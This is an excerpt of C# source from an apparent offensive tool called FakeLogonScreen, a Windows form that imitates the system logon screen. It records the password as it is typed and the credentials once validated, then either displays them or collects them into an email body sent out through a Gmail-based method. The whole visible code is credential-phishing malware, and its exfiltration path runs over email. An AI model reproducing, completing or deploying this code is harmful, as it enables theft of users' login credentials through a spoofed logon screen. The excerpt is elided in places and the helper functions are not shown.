...
namespace FakeLogonScreen
{
    public partial class LogonScreen : Form
    {
        ...
        public LogonScreen(Dictionary<string,string> method)
        {
            InitializeComponent();
            this.method = method;
            this.emailContent = "";
        ...
        private void mtbPassword_KeyUp(object sender, KeyEventArgs e)
        {
            ...
            // Print to console
            if (method["method"] == "gmail")
            {
                this.emailContent += ((MaskedTextBox)sender).Text + "<br />";
            }
            else
            {
                Utils.showData(this.method, ((MaskedTextBox)sender).Text);
            }
        }
        ...
        private void ValidateCredentials()
        {
            ...
            try
            {
                ...
                if (this.method["method"] == "gmail")
                {
                    this.emailContent += line+"<br />";
                }
                else
                {
                Utils.showData(this.method, line);
            ...
            else
            {
                ...
                Utils.sendEmail(this.method, this.emailContent);
